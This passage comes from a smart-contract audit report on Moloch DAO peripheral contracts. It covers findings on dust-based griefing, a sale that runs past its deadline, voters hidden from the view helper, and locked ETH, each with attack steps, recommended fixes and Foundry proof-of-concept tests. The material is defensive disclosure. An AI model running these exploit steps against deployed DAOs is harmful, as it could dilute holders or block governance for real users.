Readiness checks should be based on state that only trusted actors or trusted workflows can mutate. Using attacker-influenceable external token balances as control-plane state creates a griefing surface even when no privileged function is exposed.

##### Defense in Depth
- Add a DAO-only sweep path for unsolicited `tokenB` deposits so accidental or hostile dust can be cleared without full reconfiguration.
- Emit a dedicated event when the balance gate blocks readiness, including the observed and expected values, so operators can detect and react to griefing quickly.

##### Verification Guidance
- Add a regression test proving that an unsolicited third-party `tokenB` transfer no longer flips a ready seed into a non-ready state.
- Add a test proving that legitimate, DAO-authorized inventory reductions still move the tracked value below `minSupply` and allow `seed()`.
- If a sweep helper is added, verify that only the DAO can invoke it and that repeated attacker dusting does not silently alter the tracked readiness value.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd $(git rev-parse --show-toplevel)
forge build
```

##### Runnable PoC
Save the following as `test/LPSeedSwapHookDustDoS.t.sol` and run `forge test --match-test test_MinSupplyGateCanBeBrokenByDustingDaoBalance -vv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch} from "../src/Moloch.sol";
import {SafeSummoner, Call} from "../src/peripheral/SafeSummoner.sol";
import {LPSeedSwapHook} from "../src/peripheral/LPSeedSwapHook.sol";

contract MockERC20Dust {
    string public name = "Mock";
    string public symbol = "MCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LPSeedSwapHookDustDoSTest is Test {
    SafeSummoner internal safe;
    LPSeedSwapHook internal lpSeed;
    MockERC20Dust internal tokenB;

    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function setUp() public {
        vm.createSelectFork("main");
        vm.deal(alice, 10 ether);
        safe = new SafeSummoner();
        lpSeed = new LPSeedSwapHook();
        tokenB = new MockERC20Dust();
    }

    function test_MinSupplyGateCanBeBrokenByDustingDaoBalance() public {
        bytes32 salt = bytes32(uint256(601));
        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory initShares = new uint256[](1);
        initShares[0] = 100e18;

        address dao = safe.predictDAO(salt, holders, initShares);

        Call[] memory extra = new Call[](3);
        extra[0] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(lpSeed), address(0), 1 ether))
        );
        extra[1] = Call(
            dao,
            0,
            abi.encodeCall(Moloch.setAllowance, (address(lpSeed), address(tokenB), 100e18))
        );
        extra[2] = Call(
            address(lpSeed),
            0,
            abi.encodeCall(
                lpSeed.configure,
                (
                    address(0),
                    uint128(1 ether),
                    address(tokenB),
                    uint128(100e18),
                    uint40(0),
                    address(0),
                    uint128(100e18)
                )
            )
        );

        SafeSummoner.SafeConfig memory cfg;
        cfg.proposalThreshold = 1e18;
        cfg.proposalTTL = 7 days;

        safe.safeSummon(
            "DustDAO",
            "DUST",
            "",
            1000,
            true,
            address(0),
            salt,
            holders,
            initShares,
            cfg,
            extra
        );

        vm.deal(dao, 1 ether);
        tokenB.mint(dao, 100e18);
        assertTrue(lpSeed.seedable(dao), "baseline should be seedable");

        tokenB.mint(attacker, 1);
        vm.prank(attacker);
        tokenB.transfer(dao, 1);

        assertFalse(lpSeed.seedable(dao), "dust should block the minSupply gate");
        vm.expectRevert(LPSeedSwapHook.NotReady.selector);
        lpSeed.seed(dao);
    }
}
```

##### Steps
1. Save the PoC test file above.
- Expected: the repository still compiles successfully.
2. Run the targeted Foundry test.
```bash
forge test --match-test test_MinSupplyGateCanBeBrokenByDustingDaoBalance -vv
```
- Expected: the test passes.

##### Verification
Confirm `lpSeed.seedable(dao)` starts `true`, flips to `false` after the attacker transfers one `tokenB` unit into the DAO, and the subsequent `lpSeed.seed(dao)` call reverts with `NotReady()`.

##### Outcome
An attacker can keep the min-supply gate unsatisfied by dusting `tokenB` into the DAO treasury, blocking permissionless seeding until governance reconfigures or drains the excess balance.

</details>

---

<details>
<summary><strong>25. ShareBurner closeSale leaves built-in DAO sales live after expiry</strong></summary>

> **Review: Valid novel finding targeting ShareBurner/SafeSummoner peripheral. Medium severity accepted for peripheral scope.** The observation that `ShareBurner.closeSale()` burns unsold inventory but doesn't deactivate the built-in `setSale` is a genuine design gap. Not a Moloch.sol core finding — targets `ShareBurner.sol` + `SafeSummoner.sol` wiring. Impact is moderate: post-expiry buyers would find no inventory (shares already burned), but the sale's `active` flag being true is misleading. **V2 hardening:** include a `setSale(..., active: false)` call in the burn permit's delegatecall payload.

**Winfunc ID:** `14`

**CVSS Score:** `5.3`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`

**Vulnerability Type:** `CWE-841: Improper Enforcement of Behavioral Workflow`

**Source Location:** `src/peripheral/SafeSummoner.sol:684:_buildCalls()`

**Sink Location:** `src/Moloch.sol:745:buyShares()`

#### Summary

An unauthenticated buyer can keep purchasing from a supposedly expired DAO sale in the ShareBurner-integrated built-in sale flow, leading to post-deadline token issuance and sale-window integrity failure.

#### Root Cause

`SafeSummoner._buildCalls()` wires `saleActive` into `Moloch.setSale(...)` and wires `saleBurnDeadline` into a separate one-shot `ShareBurner.burnUnsold(...)` permit, but the core `Moloch.Sale` state has no deadline field. `ShareBurner.closeSale()` only spends that permit to delegatecall `burnUnsold()`, which burns the DAO's current balance after the timestamp; it never deactivates the sale or zeroes its cap. `Moloch.buyShares()` therefore continues to mint or transfer tokens whenever `sales[payToken].active` remains true.

#### Impact

###### Confirmed Impact
After the configured deadline, anyone can still buy shares or loot through `Moloch.buyShares()`. In non-minting sales this remains true until a separate `closeSale` transaction is mined, and in minting sales it remains true even after `closeSale()` succeeds because burning DAO-held inventory does not disable mint issuance.

###### Potential Follow-On Impact
If the sold asset is voting shares, late buyers can dilute governance and participate in proposal voting outside the intended sale window. If the sold asset is ragequittable or otherwise treasury-entitling, the extra issuance can also dilute existing holders' economic position or later translate into treasury extraction, depending on DAO configuration. Searchers can additionally MEV-front-run the first close attempt in non-minting sales to capture inventory that operators expected to become unsold and burned.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:108](../src/Moloch.sol#L108)**

   ```solidity
   struct Sale { uint256 pricePerShare; uint256 cap; bool minting; bool active; bool isLoot; }
   ```

   The core built-in sale state has no deadline field, so no purchase-time expiry can be enforced from sale storage.

2. **[src/peripheral/SafeSummoner.sol:669](../src/peripheral/SafeSummoner.sol#L669)**

   ```solidity
   abi.encodeCall(IMoloch.setSale, (c.salePayToken, c.salePricePerShare, c.saleCap, c.saleMinting, true, c.saleIsLoot))
   ```

   SafeSummoner activates the built-in sale but passes only price/cap/minting/active/isLoot into Moloch; the configured burn deadline is not part of the sale state.

3. **[src/peripheral/SafeSummoner.sol:684](../src/peripheral/SafeSummoner.sol#L684)**

   ```solidity
   if (c.saleBurnDeadline > 0) { ... abi.encodeCall(IShareBurner.burnUnsold, (sharesAddr, c.saleBurnDeadline)); }
   ```

   The configured deadline is routed only into a separate ShareBurner permit, creating a split workflow where expiry affects cleanup but not buying.

4. **[src/peripheral/ShareBurner.sol:42](../src/peripheral/ShareBurner.sol#L42)**

   ```solidity
   if (block.timestamp <= deadline) revert SaleActive(); uint256 bal = IShares(shares).balanceOf(address(this)); if (bal != 0) IShares(shares).burnFromMoloch(address(this), bal);
   ```

   ShareBurner enforces the timestamp only when burning the DAO's current balance. It does not modify sale activity, cap, or any other Moloch sale state.

5. **[src/peripheral/ShareBurner.sol:52](../src/peripheral/ShareBurner.sol#L52)**

   ```solidity
   IMoloch(dao).spendPermit(1, address(this), 0, abi.encodeWithSelector(this.burnUnsold.selector, shares, deadline), nonce);
   ```

   closeSale spends a one-shot delegatecall permit to run burnUnsold, but never calls setSale(..., active=false) or an equivalent sale-disabling action.

6. **[src/Moloch.sol:712](../src/Moloch.sol#L712)**

   ```solidity
   Sale storage s = sales[payToken]; if (!s.active) revert NotOk(); uint256 cap = s.cap; if (cap != 0 && shareAmount > cap) revert NotOk();
   ```

   The public purchase path checks only active/cap and remains callable after the configured deadline because no expiry state is consulted here.

7. **[src/Moloch.sol:745](../src/Moloch.sol#L745)**

   ```solidity
   if (s.minting) { ... shares.mintFromMoloch(msg.sender, shareAmount); } else { ... shares.transfer(msg.sender, shareAmount); }
   ```

   Dangerous sink: after the deadline, the attacker still receives newly minted shares/loot or transferred DAO-held inventory because the sale remains live.

#### Exploit Analysis

##### Attack Narrative
The attacker watches a DAO that used the built-in `Moloch.setSale(...)` flow together with `SafeSummoner`'s `saleBurnDeadline` / `ShareBurner` integration. Once the configured deadline passes, the attacker does not need any privileged role: they can call `Moloch.buyShares()` directly because the core sale state still shows `active = true`, and `buyShares()` never checks the deadline. For a non-minting sale, the attacker can simply buy before anyone calls `closeSale()`, or front-run the first `closeSale()` transaction so their purchase executes before the DAO's remaining balance is burned.

The minting variant is stronger. Even if a third party has already called `ShareBurner.closeSale()`, the burn only affects the DAO's current share balance and does not touch `sales[payToken].active` or the minting logic in `buyShares()`. The attacker can therefore buy after the deadline and after the purported close, receiving newly minted shares from the still-live sale.

##### Prerequisites
- **Attacker Control/Position:** Control of any EOA or contract that can call public sale functions; optional mempool visibility for the non-minting front-run variant
- **Required Access/Placement:** Unauthenticated / public caller
- **User Interaction:** None
- **Privileges/Configuration Required:** The DAO must have an active built-in `Moloch` sale and have configured `saleBurnDeadline` / `ShareBurner` instead of separately disabling the sale through governance. The post-close persistence case specifically requires a minting sale.
- **Knowledge Required:** DAO address, payment token, sale price, and the configured deadline (or observation of the close transaction)
- **Attack Complexity:** Low — the attacker just waits until the deadline passes and calls a public function; the non-minting MEV variant only adds ordinary transaction ordering competition

##### Attack Steps
1. Identify a DAO deployed or configured with built-in `setSale(..., active=true)` and a `ShareBurner` deadline permit.
2. Wait until `saleBurnDeadline` has passed.
3. Call `Moloch.buyShares(payToken, shareAmount, maxPay)` directly.
4. For non-minting sales, do this before the first `closeSale()` is mined, or front-run that transaction in the same block.
5. For minting sales, even after `ShareBurner.closeSale()` succeeds, call `buyShares()` and receive freshly minted shares.

##### Impact Breakdown
- **Confirmed Impact:** Post-deadline purchases remain possible, causing token distribution outside the intended sale window and holder dilution.
- **Potential Follow-On Impact:** If the issued asset is voting shares or treasury-entitling inventory, the attacker may later influence governance, quorum math, ragequit economics, or other downstream DAO decisions; these effects depend on the specific DAO configuration.
- **Confidentiality:** None — the flaw does not expose secret data.
- **Integrity:** Low — the sale workflow can be bypassed so token issuance/distribution occurs after the configured deadline.
- **Availability:** None — the issue does not directly block protocol functionality.

#### Recommended Fix

The deadline must be enforced on the actual purchase path, not only on a later cleanup path. The most robust fix is to add a deadline to the core `Moloch.Sale` state and make `buyShares()` revert after expiry. `ShareBurner` can then remain a cleanup helper for burning leftover inventory after the sale is already unbuyable.

Before:
```solidity
struct Sale {
    uint256 pricePerShare;
    uint256 cap;
    bool minting;
    bool active;
    bool isLoot;
}

function buyShares(address payToken, uint256 shareAmount, uint256 maxPay) public payable nonReentrant {
    if (shareAmount == 0) revert NotOk();
    Sale storage s = sales[payToken];
    if (!s.active) revert NotOk();
    // ...
}
```

After:
```solidity
struct Sale {
    uint256 pricePerShare;
    uint256 cap;
    uint40 deadline; // 0 = no deadline
    bool minting;
    bool active;
    bool isLoot;
}

function buyShares(address payToken, uint256 shareAmount, uint256 maxPay) public payable nonReentrant {
    if (shareAmount == 0) revert NotOk();
    Sale storage s = sales[payToken];
    if (!s.active) revert NotOk();
    if (s.deadline != 0 && block.timestamp > s.deadline) revert NotOk();
    // ...
}
```

If changing `Moloch.Sale` is not possible, then `ShareBurner.closeSale()` must atomically disable the specific sale in the same transaction before burning leftovers (for example via a dedicated DAO self-call such as `disableSale(payToken)` or a second permit that flips `active` to `false`). In that model, the burn helper should not be marketed as a sale deadline by itself.

##### Security Principle
Expiry checks must be enforced at the authority point where value is issued or transferred. Post-hoc cleanup is not an authorization control, because attackers can always interact with the still-live issuance path before or after cleanup unless that path itself rejects expired operations.

##### Defense in Depth
- Rename or document `saleBurnDeadline` / `closeSale()` as cleanup-only unless purchase-path enforcement is added, to avoid operator assumptions that the field ends the sale.
- Emit an explicit sale-disabled or sale-expired event from the core sale contract/module so off-chain monitors and UIs can distinguish between "inventory burned" and "purchases no longer possible."

##### Verification Guidance
- Add a regression test proving `buyShares()` reverts after the configured deadline for both minting and non-minting sales.
- Add a regression test proving a `closeSale()` or equivalent finalization action leaves the sale unbuyable afterward while legitimate pre-deadline purchases still succeed.
- Add an integration test covering a mempool-equivalent ordering case: after deadline, if a close/finalize action and a buy are in the same block, the finalize path must prevent the late buy from succeeding.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd $(git rev-parse --show-toplevel)
forge build
```

##### Runnable PoC
Save the following as `test/ShareBurnerDeadlineBypass.t.sol` and run `forge test --match-path test/ShareBurnerDeadlineBypass.t.sol -vv`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Moloch, Shares} from "../src/Moloch.sol";
import {SafeSummoner, Call, SHARE_BURNER} from "../src/peripheral/SafeSummoner.sol";
import {ShareBurner} from "../src/peripheral/ShareBurner.sol";

contract ShareBurnerDeadlineBypassPoC is Test {
    SafeSummoner internal safe;
    address internal alice = address(0xA11CE);

    function setUp() public {
        vm.createSelectFork("main");
        vm.deal(alice, 100 ether);
        safe = new SafeSummoner();
    }

    function _holders() internal view returns (address[] memory h, uint256[] memory s) {
        h = new address[](1);
        h[0] = alice;
        s = new uint256[](1);
        s[0] = 100e18;
    }

    function test_nonMintingBuyStillWorksAfterDeadlineUntilClose() public {
        bytes32 salt = bytes32(uint256(801));
        uint256 deadline = block.timestamp + 30 days;
        (address[] memory h, uint256[] memory s) = _holders();

        address dao = safe.predictDAO(salt, h, s);
        address sharesAddr = safe.predictShares(dao);

        SafeSummoner.SafeConfig memory cfg;
        cfg.proposalThreshold = 1e18;
        cfg.proposalTTL = 7 days;
        cfg.saleActive = true;
        cfg.salePricePerShare = 1;
        cfg.saleMinting = false;
        cfg.saleBurnDeadline = deadline;

        Call[] memory extra = new Call[](1);
        extra[0] = Call(
            sharesAddr,
            0,
            abi.encodeWithSignature("mintFromMoloch(address,uint256)", dao, 90e18)
        );

        safe.safeSummon("BurnTest", "BT", "", 1000, true, address(0), salt, h, s, cfg, extra);
        Moloch m = Moloch(payable(dao));

        vm.warp(deadline + 1);
        vm.deal(address(this), 10e18);
        m.buyShares{value: 10e18}(address(0), 10e18, 0);

        assertEq(Shares(sharesAddr).balanceOf(address(this)), 10e18);
    }

    function test_mintingBuyStillWorksEvenAfterClose() public {
        bytes32 salt = bytes32(uint256(802));
        uint256 deadline = block.timestamp + 30 days;
        (address[] memory h, uint256[] memory s) = _holders();

        address dao = safe.predictDAO(salt, h, s);
        address sharesAddr = safe.predictShares(dao);

        SafeSummoner.SafeConfig memory cfg;
        cfg.proposalThreshold = 1e18;
        cfg.proposalTTL = 7 days;
        cfg.saleActive = true;
        cfg.salePricePerShare = 1;
        cfg.saleMinting = true;
        cfg.saleBurnDeadline = deadline;

        safe.safeSummon("MintBurn", "MB", "", 1000, true, address(0), salt, h, s, cfg, new Call[](0));
        Moloch m = Moloch(payable(dao));

        vm.warp(deadline + 1);
        ShareBurner(SHARE_BURNER).closeSale(dao, sharesAddr, deadline, keccak256("ShareBurner"));

        vm.deal(address(this), 1e18);
        uint256 before = Shares(sharesAddr).balanceOf(address(this));
        m.buyShares{value: 1e18}(address(0), 1e18, 0);
        assertEq(Shares(sharesAddr).balanceOf(address(this)), before + 1e18);
    }
}
```

##### Steps
1. Save the PoC test file above.
- Expected: the repository still compiles successfully.
2. Run the targeted Foundry test file.
```bash
forge test --match-path test/ShareBurnerDeadlineBypass.t.sol -vv
```
- Expected: both tests pass.

##### Verification
Confirm the non-minting sale remains purchasable after the burn deadline until somebody explicitly calls `closeSale`, and confirm the minting sale still mints shares even after `ShareBurner.closeSale(...)` succeeds.

##### Outcome
`saleBurnDeadline` installs only a burn permit; it does not deactivate the built-in sale, so expired sales can remain live and minting sales continue indefinitely even after the burn helper is used.

</details>

---

<details>
<summary><strong>26. Governance helper omits delegated and non-seat voters, hiding real votes and receipt state</strong></summary>

> **Review: Valid novel finding targeting MolochViewHelper peripheral. Medium severity accepted for peripheral scope.** The view-helper omission of delegate/non-seat voters from governance views is a genuine design gap not previously documented. Not a Moloch.sol core finding — targets `MolochViewHelper.sol`. Impact is UX-layer: real on-chain votes are hidden from dapp displays, which could mislead users about participation. No fund loss. Same root cause as #28. **V2 hardening:** extend the view helper to enumerate voters from ERC-6909 receipt holders or emit indexed vote events that the helper can query.

**Winfunc ID:** `7`

**CVSS Score:** `4.3`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`

**Vulnerability Type:** `CWE-451: User Interface (UI) Misrepresentation of Critical Information`

**Source Location:** `src/Moloch.sol:369:castVote()`

**Sink Location:** `dapp/Majeur.html:22840:renderProposals()`

#### Summary

An attacker can cast a real governance vote from an unseated or delegated-only address in the helper-backed governance flow, leading to concealed voting participation and misreported vote-receipt state in the official dapp.

#### Root Cause

`Moloch.castVote()` authorizes any address with nonzero snapshot voting power, including an address that holds no shares and only received delegated votes. `MolochViewHelper._getMembers()` and `_getProposals()` do not enumerate that full voter universe: they derive `ProposalView.voters` only by scanning badge seats returned by `badges.getSeats()`, which are just the sticky top-256 share holders. The official dapp then treats `proposal.voters` as authoritative when deciding whether an address voted and whether vote receipts exist.

#### Impact

###### Confirmed Impact
Real on-chain votes can be omitted from the helper and the dapp's displayed voter lists even though proposal tallies include them. For affected addresses, the official dapp can falsely report that they have not voted and can hide their vote-receipt collectibles/claim state.

###### Potential Follow-On Impact
A coalition can use delegated or non-seat voting addresses to obscure who supported or opposed a proposal in the official interface, which can mislead governance observers and participants who rely on the shipped UI. Delegated-only voters may also fail to discover their DAO entry or futarchy receipt via normal UI flows unless they fall back to manual contract/RPC inspection.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:369](../src/Moloch.sol#L369)**

   ```solidity
   uint96 weight = uint96(shares.getPastVotes(msg.sender, snap));
   ```

   Voting eligibility is based on snapshot voting power, so an address can vote with delegated power even if it has no shares and no badge seat.

2. **[src/Moloch.sol:379](../src/Moloch.sol#L379)**

   ```solidity
   hasVoted[id][msg.sender] = support + 1; voteWeight[id][msg.sender] = weight;
   ```

   The protocol records the vote on-chain for that address and includes its weight in governance state.

3. **[src/peripheral/MolochViewHelper.sol:689](../src/peripheral/MolochViewHelper.sol#L689)**

   ```solidity
   Seat[] memory seats = badges.getSeats();
   ```

   The helper narrows its candidate voter universe to badge seats, which are only the sticky top-256 share-holder seats rather than all legal voters.

4. **[src/peripheral/MolochViewHelper.sol:780](../src/peripheral/MolochViewHelper.sol#L780)**

   ```solidity
   address voterAddr = members[j].account; uint8 hv = M.hasVoted(pid, voterAddr);
   ```

   When building `ProposalView.voters`, the helper only checks vote records for those seated addresses, so real off-seat voters are silently dropped.

5. **[dapp/Majeur.html:22840](../dapp/Majeur.html#L22840)**

   ```solidity
   const userVote = proposal.voters?.find(v => v.voter?.toLowerCase() === connectedAddress.toLowerCase());
   ```

   The official dapp trusts the truncated `proposal.voters` array as authoritative and can therefore misreport that the connected address has not voted.

#### Exploit Analysis

##### Attack Narrative
The attacker is a governance participant who can obtain snapshot voting power, either by holding shares directly or by receiving delegation from cooperating holders. Instead of voting from a visible seat-holder address, the attacker casts the vote from a fresh or otherwise unseated address that has voting power but no badge seat.

Because the helper derives `proposal.voters` from badge seats rather than from the full set of recorded voters, the official dapp never associates that vote with the attacker's chosen address. The proposal tallies still move on-chain, but the dapp can show the address as if it never voted, omit its receipt collection, and hide the address from member collectible inspection.

##### Prerequisites
- **Attacker Control/Position:** Control of an address that will cast the vote plus sufficient snapshot voting power via owned shares or delegation
- **Required Access/Placement:** Unauthenticated public participant / delegated voter
- **User Interaction:** Required — the victim or observer must rely on the official dapp or helper output for vote attribution/receipt visibility
- **Privileges/Configuration Required:** No admin privileges; the voting address only needs to be outside the badge-seat set (easy with a zero-share delegate address or a non-top-256 holder)
- **Knowledge Required:** DAO address and proposal ID (or normal dapp usage)
- **Attack Complexity:** Low — delegation and off-seat voting are first-class protocol behaviors, and the dapp already trusts the truncated helper output

##### Attack Steps
1. Obtain voting power for an address that does not own a badge seat, e.g. delegate shares to a fresh zero-share address.
2. Open or find an active proposal and call `castVote()` from that unseated address.
3. Let observers or the voter load DAO state through `MolochViewHelper.getDAOFullState()` / `getUserDAOsFullState()` via the official dapp.
4. Observe that the proposal tally reflects the vote while `proposal.voters` omits the address, the proposal UI marks the address as not voted, and vote-receipt discovery is skipped.

##### Impact Breakdown
- **Confirmed Impact:** The shipped UI can misrepresent whether a specific address voted and can hide that address's vote-receipt state even though the vote is valid and counted on-chain.
- **Potential Follow-On Impact:** Hidden attribution can distort governance monitoring, social consensus, and post-vote audit workflows; delegated-only users may also miss DAO discovery or reward-claim reminders unless they inspect contracts manually.
- **Confidentiality:** None — no secret data is exposed.
- **Integrity:** Low — governance participation metadata shown by the official interface can be false for real votes.
- **Availability:** None — on-chain voting and claiming remain possible through direct contract interaction.

#### Recommended Fix

Do not expose or consume `ProposalView.voters` as if it were exhaustive unless the protocol can enumerate every recorded voter. The robust fix is to store proposal voter addresses when votes are cast and have the helper iterate that registry instead of iterating badge seats.

Before:
```solidity
MemberView[] memory members = _getMembers(meta.sharesToken, meta.lootToken, meta.badgesToken);
...
for (uint256 j; j < memberCount; ++j) {
    address voterAddr = members[j].account;
    uint8 hv = M.hasVoted(pid, voterAddr);
    ...
}
```

After:
```solidity
// src/Moloch.sol
mapping(uint256 => address[]) internal proposalVoters;

function castVote(uint256 id, uint8 support) public {
    ...
    if (hasVoted[id][msg.sender] != 0) revert AlreadyVoted();
    ...
    hasVoted[id][msg.sender] = support + 1;
    voteWeight[id][msg.sender] = weight;
    proposalVoters[id].push(msg.sender);
}

function getProposalVoters(uint256 id) external view returns (address[] memory) {
    return proposalVoters[id];
}
```

```solidity
// src/peripheral/MolochViewHelper.sol
address[] memory voterAddrs = M.getProposalVoters(pid);
VoterView[] memory voters = new VoterView[](voterAddrs.length);
uint256 k;
for (uint256 j; j < voterAddrs.length; ++j) {
    address voterAddr = voterAddrs[j];
    uint8 hv = M.hasVoted(pid, voterAddr);
    if (hv == 0) continue; // e.g. cancelled vote
    voters[k++] = VoterView({
        voter: voterAddr,
        support: hv - 1,
        weight: uint256(M.voteWeight(pid, voterAddr))
    });
}
```

If that storage change is too invasive for an immediate patch, then the dapp must stop treating `proposal.voters` as exhaustive. For connected-user status and member collectible views, call `hasVoted(proposalId, address)` and `voteWeight(proposalId, address)` directly instead of scanning `proposal.voters`.

##### Security Principle
Security-critical UIs must derive authoritative state either from exhaustive on-chain data or from direct point queries against canonical contract state. Subset enumerations should never be given exhaustive names or trusted for authorization- or governance-relevant decisions.

##### Defense in Depth
- Rename the helper field/comment to something explicit like `seatVoters` until exhaustive enumeration exists, so downstream consumers do not mistake it for the full voter set.
- Extend `getUserDAOs` / `getUserDAOsFullState` or add a dedicated user-voting-discovery path so delegated-only voters are not invisible to wallet dashboards.
- Add regression tests for zero-share delegated voters and non-seat voters to prevent future UI/helper mismatches.

##### Verification Guidance
- Add a test where a zero-share address receives delegation, votes successfully, and then appears in the returned `ProposalView.voters` (or is found through direct dapp `hasVoted` checks).
- Add a frontend test proving `renderProposals()` and `renderVoteReceipts()` report the delegated-only voter as having voted and surface the receipt/claim state.
- Add a negative test showing that a non-voting unseated address is still not listed or marked as voted.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
git clone <REPO_URL>
cd <REPO_DIR>
forge test -q
```

##### Runnable PoC
Add the following test to `test/MolochViewHelper.t.sol` inside `MolochViewHelperTest`:
```solidity
function test_OffSeatDelegateVoteIsHiddenByViewHelper() public {
    address eve = address(0xE11E);
    bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 777);
    uint256 id = moloch.proposalId(0, address(target), 0, data, keccak256("hidden-vote"));

    // Give Eve voting power without giving Eve shares or a badge seat.
    vm.prank(alice);
    shares.delegate(eve);
    assertEq(shares.balanceOf(eve), 0);
    assertEq(badges.seatOf(eve), 0);

    // Move to the next block so the delegation is visible at the proposal snapshot.
    vm.roll(block.number + 1);

    vm.prank(alice);
    moloch.openProposal(id);

    // Eve legally votes using delegated snapshot power.
    vm.prank(eve);
    moloch.castVote(id, 1); // FOR

    // On-chain state proves the vote exists and is counted.
    assertEq(moloch.hasVoted(id, eve), 2); // support + 1
    assertEq(moloch.voteWeight(id, eve), 60e18);

    address[] memory treasuryTokens = new address[](0);
    DAOLens memory lens =
        viewHelper.getDAOFullState(address(moloch), 0, 10, 0, 10, treasuryTokens);

    // Tallies include Eve's vote...
    assertEq(lens.proposals[0].forVotes, 60e18);

    // ...but the helper omits Eve from proposal.voters.
    bool found;
    for (uint256 i; i < lens.proposals[0].voters.length; ++i) {
        if (lens.proposals[0].voters[i].voter == eve) found = true;
    }
    assertFalse(found, "real voter should be omitted by current helper logic");

    // The delegated-only voter is also invisible to the user dashboard scan.
    UserDAOLens[] memory userDaos =
        viewHelper.getUserDAOsFullState(eve, 0, 10, 0, 10, 0, 10, treasuryTokens);
    assertEq(userDaos.length, 0);
}
```

##### Steps
1. **Add the PoC test**
- Expected: The repository still compiles.
2. **Run only the PoC**
```bash
forge test --match-test test_OffSeatDelegateVoteIsHiddenByViewHelper -vv
```
- Expected: The test passes, showing that Eve's vote is accepted on-chain and counted in tallies.
3. **Inspect the assertions**
- Expected: `moloch.hasVoted(id, eve)` and `moloch.voteWeight(id, eve)` are nonzero, while `lens.proposals[0].voters` does not contain `eve` and `getUserDAOsFullState(eve, ...)` returns an empty array.

##### Verification
Confirm that the same proposal simultaneously satisfies both conditions:
- on-chain governance state records a valid vote for the hidden address; and
- the helper output used by the dapp omits that address from `proposal.voters` and from user DAO discovery.

##### Outcome
The attacker can make a real vote count toward governance while remaining absent from the official helper-derived voter list and receipt-oriented UI flows. Users relying on the shipped dapp can be told that the address did not vote and can miss the address's receipt/claim state even though the vote was recorded on-chain.

</details>

---

<details>
<summary><strong>27. ERC20-denominated ShareSale purchases can permanently lock stray ETH</strong></summary>

> **Review: Valid novel finding targeting ShareSale peripheral. Medium severity accepted for peripheral scope.** Stray ETH sent to an ERC-20-denominated `ShareSale` purchase being permanently locked is a genuine edge case not previously documented. Not a Moloch.sol core finding — targets `ShareSale.sol`. Impact is user-error ETH loss, not an exploitable vulnerability. **V2 hardening:** reject `msg.value > 0` when the sale's payment token is an ERC-20, or refund excess ETH.

**Winfunc ID:** `8`

**CVSS Score:** `4.3`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L`

**Vulnerability Type:** `CWE-20: Improper Input Validation`

**Source Location:** `src/peripheral/ShareSale.sol:61:buy()`

**Sink Location:** `src/peripheral/ShareSale.sol:81:buy()`

#### Summary

An attacker controlling a frontend or transaction builder can induce users to attach ETH to ERC20-denominated ShareSale purchases, leading to permanent loss of the attached ETH.

#### Root Cause

`ShareSale.buy()` is declared `payable` and branches on `s.payToken` to choose between ETH and ERC20 payment handling. In the ERC20 branch, the function calls `safeTransferFrom(s.payToken, dao, cost)` but never validates `msg.value == 0` and never refunds any attached ETH, so the transaction succeeds while the ETH remains on the `ShareSale` contract.

#### Impact

###### Confirmed Impact
Any ETH attached to a successful ERC20-denominated `buy()` call becomes stuck on the `ShareSale` singleton. The buyer still pays the intended ERC20 amount and receives the purchased shares/loot, so the stray ETH loss is silent at the protocol layer.

###### Potential Follow-On Impact
A malicious frontend, wallet plugin, router, or copy-trading tool can exploit this as a user-funds-burn vector by presenting or constructing a transaction with nonzero `value` for an ERC20 sale. Repeated use can accumulate larger unrecoverable balances on `ShareSale`, but the code does not support direct attacker theft of the trapped ETH.

#### Source-to-Sink Trace

1. **[src/peripheral/ShareSale.sol:61](../src/peripheral/ShareSale.sol#L61)**

   ```solidity
   function buy(address dao, uint256 amount) public payable {
   ```

   The public entrypoint is payable, so the caller can always attach arbitrary ETH through `msg.value`, regardless of how the sale is configured.

2. **[src/peripheral/ShareSale.sol:63](../src/peripheral/ShareSale.sol#L63)**

   ```solidity
   Sale memory s = sales[dao];
   ```

   The function loads the DAO's sale configuration, including `s.payToken`, which determines whether the ETH branch or ERC20 branch runs.

3. **[src/peripheral/ShareSale.sol:73](../src/peripheral/ShareSale.sol#L73)**

   ```solidity
   if (s.payToken == address(0)) { ... } else { safeTransferFrom(s.payToken, dao, cost); }
   ```

   When `s.payToken != address(0)`, execution takes the ERC20 branch. Unlike the ETH branch, this path has no `msg.value == 0` validation and no refund logic.

4. **[src/peripheral/ShareSale.sol:82](../src/peripheral/ShareSale.sol#L82)**

   ```solidity
   safeTransferFrom(s.payToken, dao, cost);
   ```

   The contract collects the intended ERC20 payment and leaves the attached ETH untouched on its own balance.

